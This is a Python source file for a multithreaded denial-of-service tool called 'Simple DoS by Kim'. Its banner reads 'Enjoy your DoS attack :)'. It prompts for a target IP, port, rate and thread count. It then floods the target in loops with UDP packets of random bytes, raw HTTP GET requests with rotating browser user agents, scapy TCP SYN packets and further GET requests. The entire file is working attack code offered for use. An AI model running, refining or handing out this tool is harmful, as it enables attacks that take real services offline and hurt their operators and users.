import socket
import threading
import random
import os
import colorama
import requests
from scapy.all import IP, TCP, RandShort, send
from colorama import Fore
import logging
import sys
from time import sleep

# 로깅 설정 (오류 발생 시 콘솔에 출력)
logging.basicConfig(stream=sys.stdout, level=logging.ERROR)

fake_ips = [
    '192.165.6.6', '192.176.76.7', '192.156.6.6', '192.155.5.5',
    '192.143.2.2', '188.142.41.4', '187.122.12.1', '192.153.4.4',
    '192.154.32.4', '192.153.53.25', '192.154.54.5', '192.143.43.4',
    '192.165.6.9', '188.154.54.3'
]

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'
]

def clear_screen() -> None:
    os.system('clear' if os.name == 'posix' else 'cls')

logo = r"""
╔══════════════════
║   Simple DoS by Kim
║   V : 2.1.1
║   MADE BY GNDFR
║   Enjoy your DoS attack :)
╚══════════════════
"""

def flood_target(target_ip: str, target_port: int, effective_bps: int) -> None:
    while True:
        try:
            # UDP Flood
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_socket:
                payload = random._urandom(512)
                for _ in range(effective_bps // 512 + 1):
                    udp_socket.sendto(payload, (target_ip, target_port))

            # HTTP GET Flood
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as http_socket:
                try:
                    http_socket.connect((target_ip, target_port))
                    http_request = (
                        f"GET / HTTP/1.1\r\n"
                        f"Host: {target_ip}\r\n"
                        f"User-Agent: {random.choice(user_agents)}\r\n"
                        "Accept: */*\r\n"
                        "Connection: Keep-Alive\r\n\r\n"
                    ).encode()
                    http_socket.sendall(http_request)
                except (ConnectionRefusedError, TimeoutError, OSError) as e:
                    logging.error(f"[HTTP] Connection error: {e}")

            # TCP SYN Flood
            try:
                packet = IP(dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
                send(packet, verbose=False)
            except PermissionError:
                logging.error("[TCP SYN] Permission denied. Run as root/admin.")

            # requests GET
            try:
                headers = {'User-Agent': random.choice(user_agents), 'Host': target_ip}
                requests.get(f"http://{target_ip}:{target_port}", headers=headers, timeout=5)
            except requests.exceptions.RequestException as e:
                logging.error(f"[Requests] HTTP GET error: {e}")

            sleep(0.001)
        except socket.gaierror:
            logging.error("[!] Fail get target info, did you type the target correct? [!]")
            break
        except KeyboardInterrupt:
            print(Fore.LIGHTRED_EX + "\nAttack stopped by user.")
            break
        except Exception as e:
            logging.error(f"[FLOOD] An unexpected error occurred: {e}")
            sleep(1)

def main() -> None:
    clear_screen()
    print(Fore.LIGHTMAGENTA_EX + logo)

    try:
        target_ip = input("\033[1;37mIP Target : ")
        target_port = int(input("Port : "))
        bytes_per_sec = int(input("Bytes Per Sec : "))
        thread_count = int(input("Thread : "))
        use_boost = input("Use Boost ? Y/N : ").strip().lower()

        effective_bps = bytes_per_sec + 500 if use_boost == 'y' else bytes_per_sec

        clear_screen()
        print(Fore.LIGHTMAGENTA_EX + logo)
        print(Fore.LIGHTRED_EX + "Attacking...")
        print(Fore.LIGHTWHITE_EX + "ATTACK STATUS: ")
        print("╔═════════════════")
        print(f"║ IP    : {target_ip}")
        print(f"║ Port  : {target_port}")
        print(f"║ BPS   : {bytes_per_sec}")
        print(f"║ Thrds : {thread_count}")
        print(f"║ Boost : {use_boost.upper()}")
        print("╚═════════════════")

        threads = [
            threading.Thread(target=flood_target, args=(target_ip, target_port, effective_bps), daemon=True)
            for _ in range(thread_count)
        ]

        for t in threads:
            t.start()

        for t in threads:
            t.join()

    except ValueError:
        print(Fore.LIGHTRED_EX + "[!] Invalid input. Port and thread count must be integers. [!]")
    except KeyboardInterrupt:
        print(Fore.LIGHTRED_EX + "\nScript stopped by user.")
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[!] An unexpected error occurred: {e} [!]")
    finally:
        print(Fore.LIGHTWHITE_EX + "\nExiting...")

if __name__ == "__main__":
    main()
